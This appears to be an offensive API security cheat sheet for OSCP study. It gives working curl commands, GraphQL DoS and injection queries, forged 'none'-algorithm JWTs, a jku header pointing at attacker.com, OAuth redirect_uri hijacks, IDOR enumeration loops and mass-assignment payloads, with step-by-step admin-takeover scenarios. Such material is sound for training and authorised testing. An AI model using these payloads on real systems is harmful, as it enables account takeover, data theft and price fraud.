# API Security Testing Guide

## Table of Contents
1. [API Basics](#api-basics)
2. [API Enumeration](#api-enumeration)
3. [REST API Testing](#rest-api-testing)
4. [GraphQL Exploitation](#graphql-exploitation)
5. [JWT Attacks](#jwt-attacks)
6. [OAuth 2.0 Vulnerabilities](#oauth-20-vulnerabilities)
7. [API Authentication Bypass](#api-authentication-bypass)
8. [IDOR via APIs](#idor-via-apis)
9. [Mass Assignment](#mass-assignment)
10. [OSCP Scenarios](#oscp-scenarios)

---

## API Basics

### What are APIs?
Application Programming Interfaces that allow software components to communicate. Common types:
- **REST** (Representational State Transfer)
- **GraphQL** (Query Language)
- **SOAP** (Simple Object Access Protocol)
- **WebSockets**

### Common Vulnerabilities
- Authentication bypass
- Authorization flaws (IDOR)
- Excessive data exposure
- Lack of rate limiting
- Mass assignment
- Injection flaws
- Security misconfiguration

---

## API Enumeration

### Discovering API Endpoints

#### Common API Paths
```
/api/
/api/v1/
/api/v2/
/rest/
/graphql
/swagger
/api-docs
/openapi.json
/swagger.json
/swagger-ui.html
/docs
/redoc
```

#### Directory Bruteforcing
```bash
# Gobuster
gobuster dir -u http://target.com/api -w /usr/share/wordlists/dirb/common.txt

# Ffuf
ffuf -w /usr/share/seclists/Discovery/Web-Content/api/api-endpoints.txt -u http://target.com/FUZZ

# Dirsearch
dirsearch -u http://target.com/api/ -e json,xml
```

### API Documentation Discovery

#### Swagger/OpenAPI
```bash
# Common Swagger paths
http://target.com/swagger
http://target.com/swagger-ui.html
http://target.com/swagger.json
http://target.com/swagger.yaml
http://target.com/api-docs
http://target.com/api/swagger.json
http://target.com/v1/swagger.json
http://target.com/v2/swagger.json
http://target.com/openapi.json
```

#### Analyze Swagger Documentation
```bash
# Download Swagger JSON
curl http://target.com/swagger.json -o swagger.json

# Parse endpoints
cat swagger.json | jq '.paths'

# Extract all methods
cat swagger.json | jq '.paths | to_entries[] | .key as $path | .value | to_entries[] | {path: $path, method: .key}'
```

### API Endpoint Enumeration

#### Burp Suite
```
1. Browse application with Burp proxy active
2. Filter HTTP History for /api/ paths
3. Send interesting requests to Repeater
4. Note all endpoints and methods
```

#### JavaScript File Analysis
```bash
# Find JS files
curl http://target.com | grep -oP 'src="[^"]*\.js"' | cut -d'"' -f2

# Download and search for API endpoints
curl http://target.com/app.js | grep -oP '/api/[^"]*'

# Look for API keys
curl http://target.com/app.js | grep -i 'api[_-]key\|apikey\|access[_-]token'
```

---

## REST API Testing

### HTTP Methods Testing

#### Test All Methods
```bash
# GET
curl -X GET http://target.com/api/users

# POST
curl -X POST http://target.com/api/users -d '{"name":"test"}' -H "Content-Type: application/json"

# PUT (update entire resource)
curl -X PUT http://target.com/api/users/1 -d '{"name":"updated"}' -H "Content-Type: application/json"

# PATCH (partial update)
curl -X PATCH http://target.com/api/users/1 -d '{"name":"patched"}' -H "Content-Type: application/json"

# DELETE
curl -X DELETE http://target.com/api/users/1

# HEAD
curl -I http://target.com/api/users

# OPTIONS (enumerate allowed methods)
curl -X OPTIONS http://target.com/api/users -v
```

### Parameter Tampering

#### ID Parameter Manipulation
```bash
# Original request
GET /api/users/123

# Test sequential IDs
GET /api/users/1
GET /api/users/2
GET /api/users/100

# Test negative IDs
GET /api/users/-1

# Test non-numeric
GET /api/users/admin
GET /api/users/root
```

#### Hidden Parameters Discovery
```bash
# Parameter pollution
GET /api/users?id=1&id=2

# Try common parameter names
?user_id=1
?uid=1
?userId=1
?user=1
?account=1
?admin=true
?role=admin
?debug=true
?test=true
```

### Content-Type Manipulation

#### Change Content-Type
```bash
# JSON to XML
curl -X POST http://target.com/api/login \
  -H "Content-Type: application/xml" \
  -d '<?xml version="1.0"?><login><user>admin</user><pass>test</pass></login>'

# JSON to URL-encoded
curl -X POST http://target.com/api/login \
  -H "Content-Type: application/x-www-form-urlencoded" \
  -d 'user=admin&pass=test'

# Test array parameter types
# {"users": [1,2,3]} vs {"users": ["1","2","3"]}
```

---

## GraphQL Exploitation

### GraphQL Enumeration

#### Identify GraphQL Endpoint
```bash
# Common paths
/graphql
/graphiql
/graphql/console
/api/graphql
/v1/graphql
```

#### Introspection Query
```graphql
# Full introspection
{
  __schema {
    types {
      name
      fields {
        name
        type {
          name
        }
      }
    }
  }
}
```

#### Simplified Introspection
```graphql
{
  __schema {
    queryType {
      fields {
        name
        description
      }
    }
  }
}
```

### GraphQL Attacks

#### Query Batching
```graphql
# Execute multiple queries in one request
[
  {
    "query": "{ user(id: 1) { name email } }"
  },
  {
    "query": "{ user(id: 2) { name email } }"
  },
  {
    "query": "{ user(id: 3) { name email } }"
  }
]
```

#### Field Duplication (DoS)
```graphql
{
  user(id: 1) {
    name
    name
    name
    # ... repeat 1000s of times
  }
}
```

#### Recursive Query (DoS)
```graphql
{
  user(id: 1) {
    name
    friends {
      name
      friends {
        name
        friends {
          name
          # ... infinite recursion
        }
      }
    }
  }
}
```

#### Alias-Based Data Extraction
```graphql
{
  user1: user(id: 1) { name email }
  user2: user(id: 2) { name email }
  user3: user(id: 3) { name email }
  # ... extract all users
}
```

#### IDOR via GraphQL
```graphql
# Test different IDs
{
  user(id: 1) {
    name
    email
    password
    ssn
    creditCard
  }
}
```

### GraphQL Injection

#### SQL Injection via GraphQL
```graphql
{
  user(id: "1' OR '1'='1") {
    name
  }
}
```

#### NoSQL Injection
```graphql
{
  user(id: {$ne: null}) {
    name
    email
  }
}
```

---

## JWT Attacks

### JWT Basics

#### JWT Structure
```
eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIxMjM0NTY3ODkwIiwibmFtZSI6IkpvaG4gRG9lIiwiaWF0IjoxNTE2MjM5MDIyfQ.SflKxwRJSMeKKF2QT4fwpMeJf36POk6yJV_adQssw5c

[Header].[Payload].[Signature]
```

#### Decode JWT
```bash
# Online: jwt.io

# Command line
echo "eyJhbGci..." | cut -d'.' -f2 | base64 -d | jq

# Python
import jwt
decoded = jwt.decode(token, options={"verify_signature": False})
```

### JWT Vulnerabilities

#### 1. None Algorithm Attack
```python
# Change algorithm to "none" and remove signature
import jwt

payload = {
    "sub": "admin",
    "name": "Admin User",
    "iat": 1516239022
}

# Create JWT with no signature
token = jwt.encode(payload, "", algorithm="none")
print(token)
```

**Manual:**
```bash
# Header: {"alg":"none","typ":"JWT"}
# Base64: eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0

# Payload: {"sub":"admin","name":"Admin User","iat":1516239022}
# Base64: eyJzdWIiOiJhZG1pbiIsIm5hbWUiOiJBZG1pbiBVc2VyIiwiaWF0IjoxNTE2MjM5MDIyfQ

# Final JWT (note trailing dot, no signature):
eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJzdWIiOiJhZG1pbiIsIm5hbWUiOiJBZG1pbiBVc2VyIiwiaWF0IjoxNTE2MjM5MDIyfQ.
```

#### 2. Weak Secret Brute Force
```bash
# Using jwt_tool
python3 jwt_tool.py <JWT> -C -d /usr/share/wordlists/rockyou.txt

# Using hashcat
hashcat -a 0 -m 16500 jwt.txt /usr/share/wordlists/rockyou.txt

# Using john
john jwt.txt --wordlist=/usr/share/wordlists/rockyou.txt
```

#### 3. Algorithm Confusion (RS256 to HS256)
```python
# If server uses RS256 but accepts HS256
# Use public key as HMAC secret

import jwt

# Get public key
public_key = open('public.pem', 'r').read()

payload = {"sub": "admin"}

# Sign with public key as secret
token = jwt.encode(payload, public_key, algorithm='HS256')
```

#### 4. Kid (Key ID) Injection
```python
# If "kid" parameter is used to fetch key
# Inject path traversal or SQL injection

# Header with path traversal
{
  "alg": "HS256",
  "typ": "JWT",
  "kid": "../../../../../../dev/null"
}

# Sign with empty string (null bytes)
token = jwt.encode(payload, "", algorithm="HS256")

# Or SQL injection in kid
{
  "alg": "HS256",
  "typ": "JWT",
  "kid": "key1' UNION SELECT 'secret'--"
}
```

#### 5. JKU/X5U Header Injection
```python
# Point to attacker-controlled key
{
  "alg": "RS256",
  "typ": "JWT",
  "jku": "http://attacker.com/jwks.json"
}
```

### JWT Testing Checklist
- [ ] Decode JWT and analyze claims
- [ ] Test "none" algorithm
- [ ] Brute force weak secrets
- [ ] Test algorithm confusion (RS256 → HS256)
- [ ] Inject path traversal in "kid"
- [ ] Modify user role/permissions in payload
- [ ] Test expired token acceptance
- [ ] Test signature validation
- [ ] Check for sensitive data in payload

---

## OAuth 2.0 Vulnerabilities

### OAuth Flow Issues

#### Authorization Code Interception
```
1. Capture authorization code from redirect
2. Use code before legitimate client

# Intercept redirect
http://target.com/callback?code=AUTH_CODE_HERE

# Use code to get access token
curl -X POST http://target.com/oauth/token \
  -d "grant_type=authorization_code" \
  -d "code=AUTH_CODE_HERE" \
  -d "client_id=CLIENT_ID" \
  -d "client_secret=CLIENT_SECRET"
```

#### Redirect URI Manipulation
```bash
# Open redirect
http://auth-server.com/authorize?redirect_uri=http://attacker.com

# Path traversal
http://auth-server.com/authorize?redirect_uri=http://target.com@attacker.com

# Subdomain takeover
http://auth-server.com/authorize?redirect_uri=http://evil.target.com
```

#### CSRF on OAuth Callback
```html
<!-- Attacker's page -->
<img src="http://target.com/oauth/callback?code=ATTACKERS_CODE&state=CSRF">
```

---

## API Authentication Bypass

### Common Bypass Techniques

#### 1. Missing Authentication
```bash
# Test without credentials
curl http://target.com/api/users

# Test with invalid token
curl -H "Authorization: Bearer invalid_token" http://target.com/api/users
```

#### 2. Path Traversal
```bash
# Bypass authentication middleware
GET /api/users HTTP/1.1        # Requires auth
GET /api/../admin/users HTTP/1.1  # Might bypass

# URL encoding
GET /api/%2e%2e/admin/users
```

#### 3. HTTP Method Bypass
```bash
# If GET requires auth, try HEAD/OPTIONS
curl -X HEAD http://target.com/api/users
curl -X OPTIONS http://target.com/api/users
```

#### 4. Parameter Pollution
```bash
# Multiple values might bypass checks
curl http://target.com/api/users?user_id=1&user_id=2
```

#### 5. Header Injection
```bash
# Try different auth headers
curl -H "X-Original-URL: /admin" http://target.com/api/users
curl -H "X-Rewrite-URL: /admin" http://target.com/api/users
curl -H "X-Forwarded-For: 127.0.0.1" http://target.com/api/admin
```

---

## IDOR via APIs

### Insecure Direct Object Reference

#### Basic IDOR Testing
```bash
# Access your resource
GET /api/users/123
Response: {"id": 123, "name": "Your Name", "email": "you@example.com"}

# Try other IDs
GET /api/users/1
GET /api/users/2
GET /api/users/admin

# Try PUT/PATCH/DELETE
PUT /api/users/1 -d '{"name":"Hacked"}'
DELETE /api/users/1
```

#### IDOR in Different Formats
```bash
# Numeric ID
/api/users/123

# UUID
/api/users/550e8400-e29b-41d4-a716-446655440000

# Username
/api/users/admin

# Email
/api/users/admin@example.com

# Encoded
/api/users/YWRtaW4%3D  # base64: admin
```

#### Mass IDOR Enumeration
```bash
# Script to enumerate all users
for i in {1..1000}; do
  curl -s http://target.com/api/users/$i >> users.txt
done

# Using interlace
interlace -tL ids.txt -threads 10 -c "curl http://target.com/api/users/_target_ >> results.txt"
```

---

## Mass Assignment

### What is Mass Assignment?
Binding request parameters directly to objects without filtering, allowing modification of unintended fields.

### Exploitation Examples

#### Add Admin Role
```bash
# Normal request
POST /api/users
{"name": "John", "email": "john@example.com"}

# Mass assignment
POST /api/users
{"name": "John", "email": "john@example.com", "role": "admin", "isAdmin": true}
```

#### Modify Price
```bash
# Normal checkout
POST /api/checkout
{"item_id": 1, "quantity": 2}

# Mass assignment
POST /api/checkout
{"item_id": 1, "quantity": 2, "price": 0.01, "discount": 99}
```

#### Account Takeover
```bash
# Normal profile update
PATCH /api/users/123
{"name": "Updated Name"}

# Mass assignment
PATCH /api/users/123
{"name": "Updated Name", "email": "attacker@evil.com", "password": "newpass"}
```

### Finding Hidden Parameters
```bash
# Fuzz for hidden parameters
ffuf -w /usr/share/seclists/Discovery/Web-Content/api/objects.txt \
  -u http://target.com/api/users \
  -X POST \
  -d '{"FUZZ":"test"}' \
  -H "Content-Type: application/json"

# Test common fields
role, isAdmin, admin, is_admin, user_role, permissions, verified, is_verified,
balance, credits, price, discount, status, active
```

---

## OSCP Scenarios

### Scenario 1: REST API IDOR to Admin
```bash
# Step 1: Enumerate API
curl http://target.com/api/users/me
Response: {"id": 150, "name": "user", "role": "user"}

# Step 2: Test IDOR
curl http://target.com/api/users/1
Response: {"id": 1, "name": "admin", "role": "admin"}

# Step 3: Modify admin user (if PUT/PATCH works)
curl -X PATCH http://target.com/api/users/1 \
  -H "Content-Type: application/json" \
  -d '{"password":"hacked123"}'

# Step 4: Login as admin
curl -X POST http://target.com/api/login \
  -d '{"username":"admin","password":"hacked123"}'
```

### Scenario 2: JWT None Algorithm Bypass
```bash
# Step 1: Capture JWT
Authorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiJ1c2VyIn0...

# Step 2: Decode and modify
# Header: {"alg":"none","typ":"JWT"}
# Payload: {"sub":"admin"}

# Step 3: Create new JWT
eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJzdWIiOiJhZG1pbiJ9.

# Step 4: Use modified JWT
curl -H "Authorization: Bearer eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJzdWIiOiJhZG1pbiJ9." \
  http://target.com/api/admin/users
```

### Scenario 3: GraphQL IDOR
```bash
# Step 1: Introspection
curl -X POST http://target.com/graphql \
  -H "Content-Type: application/json" \
  -d '{"query":"{ __schema { types { name fields { name } } } }"}'

# Step 2: Test IDOR
curl -X POST http://target.com/graphql \
  -H "Content-Type: application/json" \
  -d '{"query":"{ user(id: 1) { name email password } }"}'

# Step 3: Extract all users
curl -X POST http://target.com/graphql \
  -H "Content-Type: application/json" \
  -d '{"query":"{ users { nodes { id name email password } } }"}'
```

### Scenario 4: Mass Assignment Privilege Escalation
```bash
# Step 1: Register normal user
curl -X POST http://target.com/api/register \
  -d '{"username":"test","password":"test123"}'

# Step 2: Update profile with mass assignment
curl -X PATCH http://target.com/api/users/me \
  -H "Authorization: Bearer YOUR_TOKEN" \
  -d '{"name":"Test","role":"admin","isAdmin":true}'

# Step 3: Access admin functions
curl -H "Authorization: Bearer YOUR_TOKEN" \
  http://target.com/api/admin/dashboard
```

---

## API Testing Checklist

### Authentication & Authorization
- [ ] Test without authentication
- [ ] Test with invalid credentials
- [ ] Test expired tokens
- [ ] Test token replay
- [ ] Test IDOR (different user IDs)
- [ ] Test privilege escalation
- [ ] Test role-based access control

### Input Validation
- [ ] SQL injection in parameters
- [ ] NoSQL injection
- [ ] Command injection
- [ ] XML/XXE injection
- [ ] SSTI in parameters
- [ ] XSS in responses

### Business Logic
- [ ] Parameter tampering
- [ ] Mass assignment
- [ ] Race conditions
- [ ] Excessive data exposure
- [ ] Improper rate limiting
- [ ] Negative numbers (price, quantity)

### API-Specific
- [ ] Test all HTTP methods
- [ ] Test GraphQL introspection
- [ ] JWT signature validation
- [ ] OAuth redirect URI bypass
- [ ] API versioning issues (/v1/ vs /v2/)
- [ ] Swagger/OpenAPI exposure

---

## Tools

### API Testing Tools
```bash
# Postman - GUI for API testing
# Burp Suite - Intercept and modify API requests

# ffuf - API endpoint fuzzing
ffuf -w wordlist.txt -u http://target.com/api/FUZZ

# Arjun - Find hidden API parameters
python3 arjun.py -u http://target.com/api/users

# jwt_tool - JWT analysis and exploitation
python3 jwt_tool.py JWT_TOKEN

# graphqlmap - GraphQL exploitation
python3 graphqlmap.py -u http://target.com/graphql

# Postman Newman - Automated API testing
newman run collection.json
```

---

## Quick Reference

### Common API Endpoints
```
/api/users
/api/v1/users
/api/admin/users
/graphql
/swagger.json
```

### Quick Tests
```bash
# IDOR
curl http://target.com/api/users/1

# JWT decode
echo "JWT" | cut -d'.' -f2 | base64 -d

# GraphQL introspection
{"query":"{ __schema { types { name } } }"}

# Mass assignment
{"role":"admin","isAdmin":true}
```

---

**Remember**: Modern OSCP often includes API testing. Master REST, GraphQL, JWT, and common API vulnerabilities!
